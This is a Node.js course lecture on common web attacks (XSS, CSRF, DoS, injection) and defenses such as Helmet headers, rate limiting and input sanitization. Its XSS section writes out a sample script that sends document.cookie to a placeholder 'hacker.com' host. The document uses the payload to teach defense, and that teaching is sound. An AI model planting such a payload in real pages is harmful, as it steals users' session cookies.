# Lecture 18: Security Headers & Common Attacks (OWASP)

## 1. The Real-World Problem
You built a beautiful app with login and roles.
**Problem:** A hacker doesn't try to "guess" your password. They send a script in a comment that steals every user's cookie (**XSS**). They send a million requests a second to crash your server (**DoS**). They try to trick your server into deleting the database via a malformed URL (**Injection**).
**The Result:** You lose user data, your reputation is destroyed, and you could face legal consequences.

## 2. Why Naive Approaches Fail
- **Naive Approach (Blacklisting):** Trying to find and remove "bad words" like `SELECT` or `<script>` from user input.
- **Why it Fails:** Hackers are creative. They can write `<sCrIpT>` or use hex encoding. You can't catch everything.
- **Naive Approach (Trusting the Browser):** Assuming the browser will protect the user. 
- **Why it Fails:** Browsers are "passive". They will do whatever the server tells them. If your server doesn't send strict "Security Headers", the browser is a wide-open door.

---

## 3. Mental Model: The Fortress
1. **The Moat (Rate Limiting):** Stops a thousand people from storming the gate at once.
2. **The Guard (Input Sanitization):** Checks every person for hidden weapons before they enter.
3. **The Wall (Security Headers):** A set of rules that tell everyone: "In this castle, we don't allow shouting, we don't allow hidden letters, and we only talk via secure channels."

---

## 4. Formal Definition: OWASP Top 10
The **Open Web Application Security Project (OWASP)** is a non-profit foundation that works to improve the security of software. The "Top 10" is their list of the most critical web application security risks.

---

## 5. Internal Working: Common Attacks

### 5.1 XSS (Cross-Site Scripting)
- **Mechanism:** User A posts a comment: `<script>fetch('hacker.com?stolen_cookie=' + document.cookie)</script>`.
- **Result:** When User B views the comment, their browser **executes** that script, sending their login cookie to the hacker.

### 5.2 CSRF (Cross-Site Request Forgery)
- **Mechanism:** You are logged into `bank.com`. You visit `evil.com`. `evil.com` has a hidden form that auto-submits to `bank.com/transfer?amount=1000`.
- **Result:** Because you are logged in, your browser sends your cookie, and the bank thinks **YOU** made the request.

---

## 6. How it fits into Node.js: The Solutions

### 6.1 Helmet.js (The Shield)
Helmet is a middleware that sets 15+ HTTP headers to secure your app.
```javascript
const helmet = require('helmet');
app.use(helmet()); 
```
- **Content-Security-Policy (CSP):** Tells the browser: "Only execute scripts from MY domain." (Kills XSS).
- **Strict-Transport-Security (HSTS):** Enforces HTTPS (Lecture 9).

### 6.2 Rate Limiting (The Moat)
```javascript
const rateLimit = require('express-rate-limit');
const limiter = rateLimit({
	windowMs: 15 * 60 * 1000, // 15 minutes
	max: 100 // Limit each IP to 100 requests per window
});
app.use(limiter);
```

### 6.3 Input Sanitization
**Never** trust `req.body` or `req.params`. 
- Use a library like `express-validator` to ensure an "email" is actually an email and not a script.

---

## 7. Security Implications: The "Defense in Depth"
You should never rely on one thing.
1. Use **HTTPS**.
2. Set **Security Headers** (Helmet).
3. Use **HttpOnly Cookies** (Lecture 16).
4. **Sanitize** all input.
5. Use **CSRF Tokens**.

---

## 8. Common Beginner Mistakes
- **Disabling CORS for everything:** `app.use(cors())`. This allows *any* website in the world to make requests to your API. **Always restrict your CORS origin.**
- **Assuming HTTPS is enough:** HTTPS only encrypts the wire. It doesn't stop XSS or Injection once the data reaches your server logic.

---

## 9. Performance Considerations
- Rate limiting requires a place to store IP counts (usually **Redis** in production). Storing them in Server RAM will crash the server if you get a real DoS attack.
- Helmet has zero overhead.

---

## 10. Edge Cases & Failure Scenarios
- **False Positives:** A strict CSP might block your own Google Analytics or external fonts. You must configure its "Whitelist" carefully.

---

## 11. When NOT to use this
- There is **never** a time NOT to use security. Even a small "Hello World" app should have basic Helmet headers.

---

## 12. Connection to Previous Topics
- Uses **HTTP Headers** (Lecture 9).
- Uses **Middleware Pipeline** (Lecture 11).
- Protects the **State** you created (Lecture 16).

---

## 13. How this appears in Real Production
- **Bug Bounty Programs:** Big companies (Google, Facebook) pay thousands of dollars to people who find these vulnerabilities.
- **Security Audits:** Professional "Penetration Testers" try to hack the server before it goes live.

---

## Assignment
1. Install `helmet`. Look at your site's headers in the "Network" tab before and after `app.use(helmet())`.
2. Try to perform a mock XSS: send `<script>alert("Hacked")</script>` to a route and see if it executes in your browser.
3. Research the `xss-clean` middleware and integrate it.

## END OF UNIT III
We have mastered real-time communication, advanced patterns, and production-grade security.
**Next Module:** **UNIT IV – MongoDB & Mongoose.** We move from temporary RAM to permanent database storage.
